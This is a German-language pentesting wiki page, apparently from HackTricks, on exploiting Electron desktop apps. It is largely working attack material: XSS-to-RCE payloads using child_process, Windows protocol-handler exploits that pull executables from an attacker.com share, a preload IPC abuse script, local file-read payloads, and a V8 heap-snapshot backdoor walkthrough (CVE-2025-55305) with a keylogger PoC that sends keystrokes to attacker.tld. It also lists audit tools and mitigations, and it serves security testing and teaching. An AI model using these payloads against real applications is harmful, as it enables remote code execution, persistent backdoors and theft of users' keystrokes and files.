# Electron Desktop-Apps

{{#include ../../../banners/hacktricks-training.md}}

## Einführung

Electron kombiniert ein lokales Backend (mit **NodeJS**) und ein Frontend (**Chromium**), obwohl es einige der Sicherheitsmechanismen moderner Browser nicht besitzt.

In der Regel findet man den Electron-App-Code innerhalb einer `.asar`-Anwendung; um den Code zu erhalten, muss man ihn extrahieren:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Im Quellcode einer Electron-App findet man in der Datei `packet.json` die Angabe der Datei `main.js`, in der Sicherheitskonfigurationen gesetzt sind.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron hat 2 Prozessarten:

- Main Process (hat vollen Zugriff auf NodeJS)
- Renderer Process (sollte aus Sicherheitsgründen eingeschränkten Zugriff auf NodeJS haben)

![](<../../../images/image (182).png>)

Ein **renderer process** wird ein Browserfenster sein, das eine Datei lädt:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Die Einstellungen des **renderer process** können im **main process** innerhalb der main.js Datei **konfiguriert** werden. Einige dieser Konfigurationen verhindern, dass die Electron-Anwendung RCE oder andere Schwachstellen erhält, wenn die **Einstellungen korrekt konfiguriert** sind.

Die Electron-Anwendung **könnte über Node apis auf das Gerät zugreifen**, obwohl sie so konfiguriert werden kann, dass dies verhindert wird:

- **`nodeIntegration`** - ist `off` by default. If on, allows to access node features from the renderer process.
- **`contextIsolation`** - ist `on` by default. If off, main and renderer processes aren't isolated.
- **`preload`** - empty by default.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - ist `off` by default. It will restrict the actions NodeJS can perform.
- Node Integration in Workers
- **`nodeIntegrationInSubframes`**- ist `off` by default.
- If **`nodeIntegration`** is **enabled**, this would allow the use of **Node.js APIs** in web pages that are **loaded in iframes** within an Electron application.
- If **`nodeIntegration`** is **disabled**, then preloads will load in the iframe

Beispiel für eine Konfiguration:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Einige **RCE payloads** aus [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Netzwerkverkehr erfassen

Passe die start-main-Konfiguration an und nutze einen Proxy, z. B.:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Wenn du eine Electron App lokal ausführen kannst, ist es möglich, dass du sie dazu bringen kannst, beliebigen javascript-Code auszuführen. Sieh nach, wie in:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Wenn die **nodeIntegration** auf **on** gesetzt ist, kann das JavaScript einer Webseite Node.js-Funktionen einfach durch Aufrufen von `require()` nutzen. Zum Beispiel ist der Weg, die calc-Anwendung unter Windows auszuführen, folgender:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Das in dieser Einstellung angegebene Script wird **vor anderen Skripten im renderer geladen**, daher hat es **unbegrenzten Zugriff auf Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Daher kann das Skript node-features in Seiten exportieren:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **Wenn `contextIsolation` aktiviert ist, funktioniert das nicht**

## RCE: XSS + contextIsolation

Die _**contextIsolation**_ führt die **getrennten Kontexte zwischen den Skripten der Webseite und dem internen JavaScript-Code von Electron** ein, sodass die Ausführung von JavaScript-Code der jeweiligen Seite die andere nicht beeinflusst. Dies ist eine notwendige Funktion, um die Möglichkeit von RCE auszuschließen.

Wenn die Kontexte nicht isoliert sind, kann ein Angreifer:

1. Im renderer beliebiges JavaScript ausführen (XSS oder Navigation zu externen Seiten)
2. **Die eingebaute Methode überschreiben**, die im preload- oder im Electron-internen Code verwendet wird, um Kontrolle zu übernehmen
3. **Die Verwendung der überschriebenen Funktion auslösen**
4. RCE?

Es gibt 2 Stellen, an denen eingebaute Methoden überschrieben werden können: im preload-Code oder im Electron-internen Code:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Bypass click event

Wenn beim Klicken auf einen Link Einschränkungen gelten, kannst du sie möglicherweise umgehen, indem du **einen Mittelklick** statt eines normalen Linksklicks ausführst.
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Für mehr Informationen zu diesen Beispielen siehe [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) und [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Beim Bereitstellen einer Electron-Desktop-Anwendung ist es entscheidend, die richtigen Einstellungen für `nodeIntegration` und `contextIsolation` sicherzustellen. Es ist etabliert, dass **client-side remote code execution (RCE)**, die auf Preload-Skripte oder Electrons nativen Code aus dem Hauptprozess abzielt, mit diesen Einstellungen effektiv verhindert wird.

Wenn ein Benutzer mit Links interagiert oder neue Fenster öffnet, werden bestimmte Event-Listener ausgelöst, die für die Sicherheit und Funktionalität der Anwendung entscheidend sind:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Diese Listener werden **von der Desktop-Anwendung überschrieben**, um ihre eigene **Geschäftslogik** zu implementieren. Die Anwendung entscheidet, ob ein angeklickter Link intern geöffnet werden soll oder im externen Webbrowser. Diese Entscheidung wird typischerweise durch eine Funktion, `openInternally`, getroffen. Wenn diese Funktion `false` zurückgibt, bedeutet das, dass der Link extern geöffnet werden soll und dazu `shell.openExternal` verwendet wird.

**Hier ein vereinfachter Pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Die Sicherheits-Best-Practices für Electron JS raten davon ab, nicht vertrauenswürdige Inhalte mit der `openExternal`-Funktion zu akzeptieren, da dies zu RCE über verschiedene Protokolle führen kann. Betriebssysteme unterstützen unterschiedliche Protokolle, die RCE auslösen könnten. Für detaillierte Beispiele und weitere Erläuterungen zu diesem Thema kann auf [diese Ressource](https://positive.security/blog/url-open-rce#windows-10-19042) verwiesen werden, die Windows-Protokoll-Beispiele enthält, die diese Verwundbarkeit ausnutzen können.

Unter macOS kann die `openExternal`-Funktion ausgenutzt werden, um beliebige Befehle auszuführen, z. B. `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Beispiele für Windows-Protokoll-Exploits umfassen:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Diese Schwachstelle ist in **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)** zu finden.

Der **webviewTag** ist eine **veraltete Funktion**, die die Verwendung von **NodeJS** im **renderer process** erlaubt, weshalb sie deaktiviert werden sollte, da sie es ermöglicht, ein Skript im preload context zu laden, wie:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Daher konnte ein Angreifer, der es schafft, eine beliebige Seite zu laden, dieses Tag nutzen, um **ein beliebiges preload script zu laden**.

Dieses preload script wurde dann missbraucht, um einen **vulnerablen IPC-Service (`skype-new-window`)** aufzurufen, der **`shell.openExternal`** aufrief, um RCE zu erlangen:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Lesen interner Dateien: XSS + contextIsolation

**Durch Deaktivierung von `contextIsolation` wird die Verwendung von `<webview>`-Tags ermöglicht**, ähnlich wie bei `<iframe>`, um lokale Dateien zu lesen und zur Exfiltration lokaler Dateien. Ein Beispiel zeigt, wie diese Schwachstelle ausgenutzt werden kann, um den Inhalt interner Dateien zu lesen:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Weiterhin wird eine weitere Methode zum **Lesen einer internen Datei** vorgestellt, die eine kritische lokale Datei-Lese-Schwachstelle in einer Electron desktop app hervorhebt. Dabei wird ein Script injiziert, um die Anwendung auszunutzen und eine Exfiltration der Daten durchzuführen:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + veraltetes chromium**

Wenn das von der Anwendung verwendete **chromium** **veraltet** ist und es bekannte **vulnerabilities** darauf gibt, kann es möglich sein, es zu **exploitieren und RCE durch eine XSS zu erlangen**.\
Ein Beispiel findest du in diesem **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via interne URL regex-Bypass**

Angenommen, du hast eine XSS gefunden, aber **kannst keine RCE auslösen oder interne Dateien stehlen**, könntest du versuchen, sie zum **Stehlen von Zugangsdaten via Phishing** zu nutzen.

Zunächst musst du wissen, was passiert, wenn versucht wird, eine neue URL zu öffnen; dafür prüfe den JS-Code im Frontend:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Der Aufruf von **`openInternally`** entscheidet, ob der **Link** im **Desktop-Fenster** **geöffnet** wird, da er zur Plattform gehört, **oder** ob er im **Browser als Drittanbieter-Ressource** geöffnet wird.

Falls der von der Funktion verwendete **regex** **anfällig für Bypässe** ist (zum Beispiel, indem **die Punkte von Subdomains nicht escaped werden**), könnte ein Angreifer die XSS ausnutzen, um **ein neues Fenster zu öffnen, das** in der Infrastruktur des Angreifers liegt und den Benutzer **nach Zugangsdaten fragt**:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Protokoll

Wie in der [Dokumentation](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) erwähnt, haben Seiten, die über **`file://`** laufen, uneingeschränkten Zugriff auf jede Datei auf deinem System. Das bedeutet, dass **XSS issues dazu genutzt werden können, beliebige Dateien** vom Rechner des Nutzers zu laden. Die Verwendung eines **custom protocol** verhindert solche Probleme, da du das Protokoll darauf beschränken kannst, nur einen bestimmten Satz von Dateien auszuliefern.

## Remote module

Das Electron Remote module erlaubt **renderer processes to access main process APIs** und erleichtert die Kommunikation innerhalb einer Electron-Anwendung. Das Aktivieren dieses Moduls bringt jedoch erhebliche Sicherheitsrisiken mit sich. Es vergrößert die Angriffsfläche der Anwendung und macht sie anfälliger für Schwachstellen wie cross-site scripting (XSS) attacks.

> [!TIP]
> Obwohl das **remote** module einige APIs vom main an renderer processes exposes, ist es nicht ohne weiteres möglich, allein durch das Ausnutzen der Komponenten RCE zu erreichen. Die Komponenten können aber sensible Informationen offenlegen.

> [!WARNING]
> Viele Apps, die das remote module noch verwenden, tun dies so, dass **NodeIntegration in der renderer process aktiviert sein muss**, was ein **riesiges Sicherheitsrisiko** darstellt.

Seit Electron 14 kann das `remote`-Modul von Electron in mehreren Schritten aktiviert werden. Aus Sicherheits- und Performance-Gründen wird jedoch dringend empfohlen, es nicht zu verwenden.

Um es zu aktivieren, muss es zuerst im **main process** aktiviert werden:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Dann kann der Renderer-Prozess Objekte aus dem Modul wie folgt importieren:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
Der **[Blogpost](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** beschreibt einige interessante **Funktionen**, die vom Objekt **`app`** des remote-Moduls bereitgestellt werden:

- **`app.relaunch([options])`**
- Startet die Anwendung neu, indem die aktuelle Instanz beendet und eine neue gestartet wird. Nützlich für App-Updates oder größere Zustandsänderungen.
- **`app.setAppLogsPath([path])`**
- Legt ein Verzeichnis für App-Logs fest oder erstellt es. Die Logs können mit **`app.getPath()`** abgerufen oder mit **`app.setPath(pathName, newPath)`** geändert werden.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- Registriert das aktuelle ausführbare Programm als Standardhandler für ein angegebenes Protokoll. Optional können ein benutzerdefinierter Pfad und Argumente angegeben werden.
- **`app.setUserTasks(tasks)`**
- Fügt Aufgaben zur Kategorie "Tasks" in der Jump List (unter Windows) hinzu. Jede Aufgabe kann steuern, wie die App gestartet wird oder welche Argumente übergeben werden.
- **`app.importCertificate(options, callback)`**
- Importiert ein PKCS#12-Zertifikat in den Zertifikatspeicher des Systems (nur Linux). Ein Callback kann verwendet werden, um das Ergebnis zu verarbeiten.
- **`app.moveToApplicationsFolder([options])`**
- Verschiebt die Anwendung in den Applications-Ordner (auf macOS). Hilft, eine standardisierte Installation für Mac-Benutzer sicherzustellen.
- **`app.setJumpList(categories)`**
- Erstellt oder entfernt eine benutzerdefinierte Jump List unter Windows. Es können Kategorien angegeben werden, um zu steuern, wie Aufgaben dem Benutzer angezeigt werden.
- **`app.setLoginItemSettings(settings)`**
- Konfiguriert, welche ausführbaren Dateien beim Login zusammen mit ihren Optionen gestartet werden (nur macOS und Windows).

Example:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences Modul

Die **primäre API** zum Zugriff auf die Systemeinstellungen und zum **Auslösen von Systemereignissen** in Electron. Methoden wie **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** und **setUserDefault** sind alle **Teil dieses Moduls**.

**Beispiel:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Hört** auf **native macOS-Benachrichtigungen** mithilfe von NSDistributedNotificationCenter.
* Vor **macOS Catalina** konnte man **alle** verteilten Benachrichtigungen abhören, indem man **nil** an CFNotificationCenterAddObserver übergab.
* Nach **Catalina / Big Sur** können sandboxed Apps weiterhin **viele Ereignisse** abonnieren (zum Beispiel **Bildschirm sperren/entsperren**, **Volume-Mounts**, **Netzwerkaktivität** usw.), indem sie Benachrichtigungen **nach Namen** registrieren.

### **getUserDefault / setUserDefault**

* **Interagiert** mit **NSUserDefaults**, das **Anwendungs-** oder **globale** Präferenzen auf macOS speichert.

* **getUserDefault** kann **sensible Informationen** **abrufen**, wie **Speicherorte kürzlich geöffneter Dateien** oder **geografische Position des Benutzers**.

* **setUserDefault** kann diese Präferenzen **ändern**, was potenziell die **Konfiguration** einer App beeinflussen kann.

* In **älteren Electron-Versionen** (vor v8.3.0) war nur die **Standard-Suite** von NSUserDefaults **zugänglich**.

## Shell.showItemInFolder

Diese Funktion zeigt die angegebene Datei im Dateimanager an, wodurch die Datei **automatisch ausgeführt werden könnte**.

Für weitere Informationen siehe [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Electron-Apps sollten eine **Content Security Policy (CSP)** haben, um **XSS-Angriffe** zu **verhindern**. Die **CSP** ist ein **Sicherheitsstandard**, der dabei hilft, die **Ausführung** von **nicht vertrauenswürdigem Code** im Browser zu **verhindern**.

Üblicherweise wird sie in der **`main.js`** Datei oder in der **`index.html`** Vorlage konfiguriert, mit der CSP in einem **meta-Tag**.

Für weitere Informationen siehe:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## **Tools**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) ist ein Tool, um Fehlkonfigurationen und Sicherheits-Anti-Pattern in Electron-basierten Anwendungen zu identifizieren.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) ist ein Open-Source VS Code Plugin für Electron-Anwendungen, das Electronegativity nutzt.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) zur Prüfung auf verwundbare Drittanbieter-Bibliotheken
- [**Electro.ng**](https://electro.ng/): Kostenpflichtig

## Labs

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) findest du ein Lab, um verwundbare Electron-Apps auszunutzen.

Einige Befehle, die dir im Lab helfen werden:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron- und Chromium-basierte Apps deserialisieren beim Start ein vorgefertigtes V8-Heap-Snapshot (v8_context_snapshot.bin und optional browser_v8_context_snapshot.bin), um jede V8-Isolate (main, preload, renderer) zu initialisieren. Historisch behandelten die Integritäts-Fuses von Electron diese Snapshots nicht als ausführbaren Inhalt, sodass sie sowohl fuse-basierte Integritätsprüfungen als auch OS-Code-Signing-Checks umgingen. Infolgedessen ermöglichte das Ersetzen des Snapshots in einer vom Benutzer beschreibbaren Installation eine unauffällige, persistente Code-Ausführung innerhalb der App, ohne die signierten Binärdateien oder ASAR zu verändern.

Key points
- Integrity gap: EnableEmbeddedAsarIntegrityValidation and OnlyLoadAppFromAsar validate app JavaScript inside the ASAR, but they did not cover V8 heap snapshots (CVE-2025-55305). Chromium similarly does not integrity-check snapshots.
- Attack preconditions: Lokales Schreiben von Dateien in das Installationsverzeichnis der App. Dies ist üblich auf Systemen, auf denen Electron-Apps oder Chromium-Browser unter für Benutzer beschreibbaren Pfaden installiert sind (z. B. %AppData%\Local unter Windows; /Applications mit Einschränkungen auf macOS).
- Effect: Zuverlässige Ausführung von Angreifer-JavaScript in jeder Isolate durch Überschreiben eines häufig verwendeten builtin (ein „Gadget“), was Persistenz und das Umgehen der Code-Signing-Überprüfung ermöglicht.
- Affected surface: Electron apps (even with fuses enabled) and Chromium-based browsers that load snapshots from user-writable locations.

Generating a malicious snapshot without building Chromium
- Use the prebuilt electron/mksnapshot to compile a payload JS into a snapshot and overwrite the application’s v8_context_snapshot.bin.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (verschiedenen Code in main vs. renderer ausführen)
- Hauptprozess-Erkennung: Node-only globals wie process.pid, process.binding(), oder process.dlopen sind im Isolat des Hauptprozesses vorhanden.
- Browser/renderer-Erkennung: Browser-only globals wie alert sind verfügbar, wenn im Dokumentkontext ausgeführt.

Beispiel-gadget, das einmal die Node-Fähigkeiten des Hauptprozesses prüft
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
Renderer/browser-context Datendiebstahl PoC (z. B. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operator-Workflow
1) Write payload.js that clobbers a common builtin (e.g., Array.isArray) and optionally branches per isolate.
2) Build the snapshot without Chromium sources:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Overwrite the target application’s snapshot file(s):
- v8_context_snapshot.bin (always used)
- browser_v8_context_snapshot.bin (if the LoadBrowserProcessSpecificV8Snapshot fuse is used)
4) Launch the application; the gadget executes whenever the chosen builtin is used.

Hinweise und Überlegungen
- Integrity/signature bypass: Snapshot files are not treated as native executables by code-signing checks and (historically) were not covered by Electron’s fuses or Chromium integrity controls.
- Persistence: Replacing the snapshot in a user-writable install typically survives app restarts and looks like a signed, legitimate app.
- Chromium browsers: The same tampering concept applies to Chrome/derivatives installed in user-writable locations. Chrome has other integrity mitigations but explicitly excludes physically local attacks from its threat model.

Erkennung und Gegenmaßnahmen
- Treat snapshots as executable content and include them in integrity enforcement (CVE-2025-55305 fix).
- Prefer admin-writable-only install locations; baseline and monitor hashes for v8_context_snapshot.bin and browser_v8_context_snapshot.bin.
- Detect early-runtime builtin clobbering and unexpected snapshot changes; alert when deserialized snapshots do not match expected values.

## **Referenzen**

- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)

- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
